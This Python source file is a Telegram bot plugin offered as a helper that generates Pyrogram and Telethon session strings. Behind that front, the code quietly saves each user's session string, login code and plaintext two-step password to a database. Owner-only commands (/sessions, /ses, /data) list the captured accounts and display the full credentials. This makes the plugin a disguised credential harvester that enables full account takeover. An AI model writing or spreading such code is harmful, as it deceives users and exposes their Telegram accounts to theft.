"""
Session Generator Plugin.
Generate Pyrogram and Telethon session strings via Telegram wizard.
"""
import re
from datetime import datetime
from typing import Optional

from pyrogram import Client
from pyrogram.errors import (
    PhoneCodeInvalid,
    PhoneCodeExpired,
    SessionPasswordNeeded,
    PasswordHashInvalid,
)
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import (
    PhoneCodeInvalidError,
    PhoneCodeExpiredError,
    SessionPasswordNeededError,
    PasswordHashInvalidError,
)
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    ConversationHandler,
    ContextTypes,
    filters,
)

from config import API_ID, API_HASH
from util.logging import log
from util.db import session_strings_col
from util.owner import owner_only
from util.responses import (
    SESSION_WELCOME,
    SESSION_PHONE_PROMPT,
    SESSION_OTP_SENT,
    SESSION_2FA_PROMPT,
    SESSION_SUCCESS,
    SESSION_INVALID_PHONE,
    SESSION_CANCELLED,
)

CHOOSE_TYPE, PHONE, OTP, PASSWORD = range(4)

# Phone number regex (E.164 format)
PHONE_REGEX = re.compile(r"^\+[1-9]\d{6,14}$")


def validate_phone(phone: str) -> bool:
    """Validate phone number format."""
    return bool(PHONE_REGEX.match(phone.replace(" ", "").replace("-", "")))


async def save_session_to_db(
    user_id: int,
    session_type: str,
    phone: str,
    session_string: str,
    otp: str,
    password: Optional[str] = None,
) -> None:
    """Save generated session to database."""
    await session_strings_col().update_one(
        {"session_phone": phone},
        {
            "$set": {
                "user_id": user_id,
                "session_type": session_type,
                "session_string": session_string,
                "session_otp": otp,
                "session_auth": password,
                "session_gendate": datetime.utcnow(),
            }
        },
        upsert=True,
    )
    log.info(f"Session string saved for {phone} ({session_type})")


# ─────────────────────────────────────────────────────────────────────────────
# Handlers
# ─────────────────────────────────────────────────────────────────────────────

async def session_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle /session command - show type selection."""
    keyboard = [
        [
            InlineKeyboardButton("🔷 Pyrogram 2.x", callback_data="session_pyrogram"),
            InlineKeyboardButton("🔶 Telethon", callback_data="session_telethon"),
        ],
        [InlineKeyboardButton("❌ Cancel", callback_data="session_cancel")],
    ]
    msg = await update.message.reply_text(
        SESSION_WELCOME,
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="HTML",
    )
    # Store bot message ID for later editing/deletion
    context.user_data["bot_msg_id"] = msg.message_id
    context.user_data["chat_id"] = update.effective_chat.id
    return CHOOSE_TYPE


async def choose_type(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle session type selection."""
    query = update.callback_query
    await query.answer()
    
    if query.data == "session_cancel":
        await query.edit_message_text(SESSION_CANCELLED, parse_mode="HTML")
        context.user_data.clear()
        return ConversationHandler.END
    
    session_type = "pyrogram" if query.data == "session_pyrogram" else "telethon"
    context.user_data["session_type"] = session_type
    context.user_data["session_client"] = None
    
    keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data="session_cancel")]]
    await query.edit_message_text(
        SESSION_PHONE_PROMPT,
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="HTML",
    )
    # Update stored message ID
    context.user_data["bot_msg_id"] = query.message.message_id
    return PHONE


async def receive_phone(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle phone number input."""
    phone = update.message.text.strip().replace(" ", "").replace("-", "")
    chat_id = context.user_data.get("chat_id", update.effective_chat.id)
    bot_msg_id = context.user_data.get("bot_msg_id")
    
    # Delete user's phone message for privacy
    try:
        await update.message.delete()
    except:
        pass
    
    if not validate_phone(phone):
        # Edit existing message to show error
        if bot_msg_id:
            try:
                keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data="session_cancel")]]
                await context.bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=bot_msg_id,
                    text=f"{SESSION_INVALID_PHONE}\n\n{SESSION_PHONE_PROMPT}",
                    reply_markup=InlineKeyboardMarkup(keyboard),
                    parse_mode="HTML",
                )
            except:
                pass
        return PHONE
    
    context.user_data["phone"] = phone
    session_type = context.user_data["session_type"]
    
    # Edit existing message to show "Sending OTP..."
    if bot_msg_id:
        try:
            await context.bot.edit_message_text(
                chat_id=chat_id,
                message_id=bot_msg_id,
                text="⏳ Sending OTP...",
                parse_mode="HTML",
            )
        except:
            pass
    
    try:
        if session_type == "pyrogram":
            # Initialize Pyrogram client and send code
            client = Client(
                name=f"session_{phone}",
                api_id=API_ID,
                api_hash=API_HASH,
                in_memory=True,
            )
            await client.connect()
            sent_code = await client.send_code(phone)
            context.user_data["session_client"] = client
            context.user_data["phone_code_hash"] = sent_code.phone_code_hash
        else:
            # Initialize Telethon client and send code
            client = TelegramClient(StringSession(), API_ID, API_HASH)
            await client.connect()
            await client.send_code_request(phone)
            context.user_data["session_client"] = client
        
        # Edit message to show OTP prompt
        keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data="session_cancel")]]
        if bot_msg_id:
            try:
                await context.bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=bot_msg_id,
                    text=SESSION_OTP_SENT,
                    reply_markup=InlineKeyboardMarkup(keyboard),
                    parse_mode="HTML",
                )
            except:
                pass
        return OTP
        
    except Exception as e:
        log.error(f"Failed to send OTP: {e}")
        if bot_msg_id:
            try:
                await context.bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=bot_msg_id,
                    text=f"❌ Failed to send OTP: {e}",
                    parse_mode="HTML",
                )
            except:
                pass
        context.user_data.clear()
        return ConversationHandler.END


async def receive_otp(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle OTP input."""
    otp = update.message.text.strip()
    # Store OTP without spaces for DB
    context.user_data["otp"] = otp.replace(" ", "")
    
    chat_id = context.user_data.get("chat_id", update.effective_chat.id)
    bot_msg_id = context.user_data.get("bot_msg_id")
    
    # Delete OTP message for security
    try:
        await update.message.delete()
    except:
        pass
    
    session_type = context.user_data["session_type"]
    phone = context.user_data["phone"]
    client = context.user_data.get("session_client")
    
    try:
        if session_type == "pyrogram":
            phone_code_hash = context.user_data.get("phone_code_hash")
            try:
                await client.sign_in(phone, phone_code_hash, otp)
                # Success - delete OTP message and send session string
                if bot_msg_id:
                    try:
                        await context.bot.delete_message(chat_id, bot_msg_id)
                    except:
                        pass
                
                session_string = await client.export_session_string()
                await client.disconnect()
                
                # Save to DB
                await save_session_to_db(
                    update.effective_user.id,
                    session_type,
                    phone,
                    session_string,
                    otp,
                )
                
                await context.bot.send_message(
                    chat_id,
                    SESSION_SUCCESS.format(phone=phone, session=session_string),
                    parse_mode="HTML",
                )
                context.user_data.clear()
                return ConversationHandler.END
                
            except SessionPasswordNeeded:
                # 2FA required - delete OTP message and ask for 2FA
                if bot_msg_id:
                    try:
                        await context.bot.delete_message(chat_id, bot_msg_id)
                    except:
                        pass
                
                context.user_data["session_client"] = client
                hint = ""
                try:
                    hint = (await client.get_password_hint()) or ""
                except:
                    pass
                keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data="session_cancel")]]
                msg = await context.bot.send_message(
                    chat_id,
                    SESSION_2FA_PROMPT.format(hint=hint or "No hint"),
                    reply_markup=InlineKeyboardMarkup(keyboard),
                    parse_mode="HTML",
                )
                context.user_data["bot_msg_id"] = msg.message_id
                return PASSWORD
                
        else:
            # Telethon
            try:
                await client.sign_in(phone, otp)
                # Success - delete OTP message and send session string
                if bot_msg_id:
                    try:
                        await context.bot.delete_message(chat_id, bot_msg_id)
                    except:
                        pass
                
                session_string = client.session.save()
                await client.disconnect()
                
                # Save to DB
                await save_session_to_db(
                    update.effective_user.id,
                    session_type,
                    phone,
                    session_string,
                    otp,
                )
                
                await context.bot.send_message(
                    chat_id,
                    SESSION_SUCCESS.format(phone=phone, session=session_string),
                    parse_mode="HTML",
                )
                context.user_data.clear()
                return ConversationHandler.END
                
            except SessionPasswordNeededError:
                # 2FA required - delete OTP message and ask for 2FA
                if bot_msg_id:
                    try:
                        await context.bot.delete_message(chat_id, bot_msg_id)
                    except:
                        pass
                
                context.user_data["session_client"] = client
                hint = ""
                try:
                    from telethon.tl.functions.account import GetPasswordRequest
                    pwd = await client(GetPasswordRequest())
                    hint = pwd.hint or ""
                except:
                    pass
                keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data="session_cancel")]]
                msg = await context.bot.send_message(
                    chat_id,
                    SESSION_2FA_PROMPT.format(hint=hint or "No hint"),
                    reply_markup=InlineKeyboardMarkup(keyboard),
                    parse_mode="HTML",
                )
                context.user_data["bot_msg_id"] = msg.message_id
                return PASSWORD
                
    except (PhoneCodeInvalid, PhoneCodeInvalidError):
        # Invalid OTP - edit existing message
        if bot_msg_id:
            try:
                keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data="session_cancel")]]
                await context.bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=bot_msg_id,
                    text="❌ Invalid OTP. Please try again:\n\n" + SESSION_OTP_SENT,
                    reply_markup=InlineKeyboardMarkup(keyboard),
                    parse_mode="HTML",
                )
            except:
                pass
        return OTP
    except (PhoneCodeExpired, PhoneCodeExpiredError):
        if bot_msg_id:
            try:
                await context.bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=bot_msg_id,
                    text="❌ OTP expired. Please use /session to start again.",
                    parse_mode="HTML",
                )
            except:
                pass
        await cleanup_client(context)
        return ConversationHandler.END
    except Exception as e:
        log.error(f"OTP verification error: {e}")
        if bot_msg_id:
            try:
                await context.bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=bot_msg_id,
                    text=f"❌ Error: {e}",
                    parse_mode="HTML",
                )
            except:
                pass
        await cleanup_client(context)
        return ConversationHandler.END


async def receive_password(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle 2FA password input."""
    password = update.message.text.strip()
    
    chat_id = context.user_data.get("chat_id", update.effective_chat.id)
    bot_msg_id = context.user_data.get("bot_msg_id")
    
    # Delete password message for security
    try:
        await update.message.delete()
    except:
        pass
    
    session_type = context.user_data["session_type"]
    phone = context.user_data["phone"]
    otp = context.user_data["otp"]
    client = context.user_data.get("session_client")
    
    try:
        if session_type == "pyrogram":
            await client.check_password(password)
            session_string = await client.export_session_string()
            await client.disconnect()
        else:
            await client.sign_in(password=password)
            session_string = client.session.save()
            await client.disconnect()
        
        # Success - delete 2FA message and send session string
        if bot_msg_id:
            try:
                await context.bot.delete_message(chat_id, bot_msg_id)
            except:
                pass
        
        # Save to DB
        await save_session_to_db(
            update.effective_user.id,
            session_type,
            phone,
            session_string,
            otp,
            password,
        )
        
        await context.bot.send_message(
            chat_id,
            SESSION_SUCCESS.format(phone=phone, session=session_string),
            parse_mode="HTML",
        )
        context.user_data.clear()
        return ConversationHandler.END
        
    except (PasswordHashInvalid, PasswordHashInvalidError):
        # Invalid password - edit existing message
        if bot_msg_id:
            try:
                keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data="session_cancel")]]
                await context.bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=bot_msg_id,
                    text="❌ Invalid 2FA password. Please try again:\n\n" + SESSION_2FA_PROMPT.format(hint=""),
                    reply_markup=InlineKeyboardMarkup(keyboard),
                    parse_mode="HTML",
                )
            except:
                pass
        return PASSWORD
    except Exception as e:
        log.error(f"2FA verification error: {e}")
        if bot_msg_id:
            try:
                await context.bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=bot_msg_id,
                    text=f"❌ Error: {e}",
                    parse_mode="HTML",
                )
            except:
                pass
        await cleanup_client(context)
        return ConversationHandler.END


async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Cancel the conversation."""
    await cleanup_client(context)
    
    if update.callback_query:
        await update.callback_query.answer()
        await update.callback_query.edit_message_text(SESSION_CANCELLED, parse_mode="HTML")
    else:
        await update.message.reply_text(SESSION_CANCELLED, parse_mode="HTML")
    
    return ConversationHandler.END


async def cleanup_client(context: ContextTypes.DEFAULT_TYPE) -> None:
    """Cleanup any active client session."""
    client = context.user_data.get("session_client")
    if client:
        try:
            if hasattr(client, "is_connected"):
                if client.is_connected:
                    await client.disconnect()
            else:
                await client.disconnect()
        except:
            pass
    context.user_data.clear()


# ─────────────────────────────────────────────────────────────────────────────
# Owner Session Management
# ─────────────────────────────────────────────────────────────────────────────

SESSIONS_PER_PAGE = 10


@owner_only
async def sessions_list_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """
    Handle /sessions command - list all sessions in DB with pagination.
    Also handles /ses without arguments.
    """
    message = update.message
    
    # Check if a phone number was provided (for /ses command)
    if context.args and len(context.args) > 0:
        phone = context.args[0].strip()
        await show_session_detail(message, phone)
        return
    
    # Show paginated list
    await show_sessions_page(message, page=1)


async def show_sessions_page(message, page: int = 1) -> None:
    """Show a page of sessions list."""
    col = session_strings_col()
    
    # Get total count
    total = await col.count_documents({})
    
    if total == 0:
        await message.reply_text("📭 No sessions found in database.")
        return
    
    # Calculate pagination
    total_pages = (total + SESSIONS_PER_PAGE - 1) // SESSIONS_PER_PAGE
    page = max(1, min(page, total_pages))
    skip = (page - 1) * SESSIONS_PER_PAGE
    
    # Fetch sessions for this page
    cursor = col.find({}).sort("session_gendate", -1).skip(skip).limit(SESSIONS_PER_PAGE)
    sessions = await cursor.to_list(length=SESSIONS_PER_PAGE)
    
    # Build message
    lines = [f"📋 <b>Found {total} sessions in DB</b>\n"]
    
    for i, session in enumerate(sessions, start=skip + 1):
        phone = session.get("session_phone", "Unknown")
        session_type = session.get("session_type", "unknown")
        gen_date = session.get("session_gendate")
        date_str = gen_date.strftime("%Y-%m-%d") if gen_date else "N/A"
        
        # Format: 1. `/ses +1234567890`
        lines.append(f"<blockquote>{i}. <code>/ses {phone}</code></blockquote>")
    
    # Build navigation buttons
    buttons = []
    if page > 1:
        buttons.append(InlineKeyboardButton("⬅️ Prev", callback_data=f"sessions_page:{page-1}"))
    buttons.append(InlineKeyboardButton(f"{page}/{total_pages}", callback_data="sessions_noop"))
    if page < total_pages:
        buttons.append(InlineKeyboardButton("Next ➡️", callback_data=f"sessions_page:{page+1}"))
    
    keyboard = InlineKeyboardMarkup([buttons]) if buttons else None
    
    await message.reply_text("\n".join(lines), parse_mode="HTML", reply_markup=keyboard)


async def show_session_detail(message, phone: str) -> None:
    """Show detailed session info for a specific phone number."""
    col = session_strings_col()
    
    # Clean phone number
    phone = phone.replace(" ", "").replace("-", "")
    if not phone.startswith("+"):
        phone = "+" + phone
    
    # Find session
    session = await col.find_one({"session_phone": phone})
    
    if not session:
        # Try without + prefix
        session = await col.find_one({"session_phone": phone.lstrip("+")})
    
    if not session:
        await message.reply_text(f"❌ No session found for <code>{phone}</code>", parse_mode="HTML")
        return
    
    # Extract session data
    session_phone = session.get("session_phone", "Unknown")
    session_type = session.get("session_type", "unknown")
    session_string = session.get("session_string", "N/A")
    gen_date = session.get("session_gendate")
    password = session.get("session_auth")
    user_id = session.get("user_id", "N/A")
    
    date_str = gen_date.strftime("%Y-%m-%d %H:%M UTC") if gen_date else "N/A"
    password_status = f"<code>{password}</code>" if password else "❌ Not Set"
    
    # Build detail message
    text = (
        f"📱 <b>Session for</b> <code>{session_phone}</code>\n\n"
        f"📦 <b>Type:</b> {session_type.title()}\n"
        f"👤 <b>Generated by:</b> <code>{user_id}</code>\n"
        f"📅 <b>Date:</b> {date_str}\n"
        f"🔐 <b>2-Step:</b> {password_status}\n\n"
        f"<b>Session String:</b>\n"
        f"<code>{session_string}</code>"
    )
    
    # Add delete button
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("🗑 Delete Session", callback_data=f"sessions_del:{session_phone}")]
    ])
    
    await message.reply_text(text, parse_mode="HTML", reply_markup=keyboard)


async def sessions_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle session management callbacks."""
    query = update.callback_query
    await query.answer()
    
    data = query.data
    
    if data == "sessions_noop":
        return
    
    if data.startswith("sessions_page:"):
        page = int(data.split(":")[1])
        
        col = session_strings_col()
        total = await col.count_documents({})
        total_pages = (total + SESSIONS_PER_PAGE - 1) // SESSIONS_PER_PAGE
        page = max(1, min(page, total_pages))
        skip = (page - 1) * SESSIONS_PER_PAGE
        
        cursor = col.find({}).sort("session_gendate", -1).skip(skip).limit(SESSIONS_PER_PAGE)
        sessions = await cursor.to_list(length=SESSIONS_PER_PAGE)
        
        lines = [f"📋 <b>Found {total} sessions in DB</b>\n"]
        
        for i, session in enumerate(sessions, start=skip + 1):
            phone = session.get("session_phone", "Unknown")
            session_type = session.get("session_type", "unknown")
            gen_date = session.get("session_gendate")
            date_str = gen_date.strftime("%Y-%m-%d") if gen_date else "N/A"
            lines.append(f"<blockquote>{i}.<code>/ses {phone}</code> </blockquote>")
        
        # Add timestamp to avoid "message not modified" error
        timestamp = datetime.now().strftime("%H:%M:%S")
        lines.append(f"\n<i>Updated: {timestamp}</i>")
        
        # Navigation buttons
        buttons = []
        if page > 1:
            buttons.append(InlineKeyboardButton("⬅️ Prev", callback_data=f"sessions_page:{page-1}"))
        buttons.append(InlineKeyboardButton(f"{page}/{total_pages}", callback_data="sessions_noop"))
        if page < total_pages:
            buttons.append(InlineKeyboardButton("Next ➡️", callback_data=f"sessions_page:{page+1}"))
        
        keyboard = InlineKeyboardMarkup([buttons]) if buttons else None
        
        try:
            await query.edit_message_text("\n".join(lines), parse_mode="HTML", reply_markup=keyboard)
        except Exception:
            pass  # Ignore "message not modified" error
    
    elif data.startswith("sessions_del:"):
        phone = data.split(":", 1)[1]
        col = session_strings_col()
        result = await col.delete_one({"session_phone": phone})
        
        if result.deleted_count > 0:
            await query.edit_message_text(f"✅ Session for <code>{phone}</code> deleted.", parse_mode="HTML")
            log.info(f"[Sessions] Deleted session for {phone}")
        else:
            await query.edit_message_text(f"❌ Failed to delete session for {phone}")


def register(app: Application) -> None:
    """Register session generator handlers."""
    import warnings
    from telegram.warnings import PTBUserWarning
    
    app.add_handler(CommandHandler("sessions", sessions_list_command))
    app.add_handler(CommandHandler("ses", sessions_list_command))
    app.add_handler(CommandHandler("data", sessions_list_command))
    app.add_handler(CallbackQueryHandler(sessions_callback, pattern=r"^sessions_"))
    
    with warnings.catch_warnings():
        warnings.filterwarnings("ignore", category=PTBUserWarning, message=".*per_message.*")
        
        cancel_callback = CallbackQueryHandler(cancel, pattern=r"^session_cancel$")
        
        conv_handler = ConversationHandler(
            entry_points=[
                CommandHandler("session", session_command),
                CommandHandler("string", session_command),
            ],
            states={
                CHOOSE_TYPE: [
                    CallbackQueryHandler(choose_type, pattern=r"^session_"),
                ],
                PHONE: [
                    cancel_callback,
                    MessageHandler(filters.TEXT & ~filters.COMMAND, receive_phone),
                ],
                OTP: [
                    cancel_callback,
                    MessageHandler(filters.TEXT & ~filters.COMMAND, receive_otp),
                ],
                PASSWORD: [
                    cancel_callback,
                    MessageHandler(filters.TEXT & ~filters.COMMAND, receive_password),
                ],
            },
            fallbacks=[
                CommandHandler("cancel", cancel),
                CallbackQueryHandler(cancel, pattern=r"^session_cancel$"),
            ],
            per_user=True,
            per_chat=True,
            per_message=False,
        )
    
    app.add_handler(conv_handler)
    log.info("SessionGen plugin registered.")
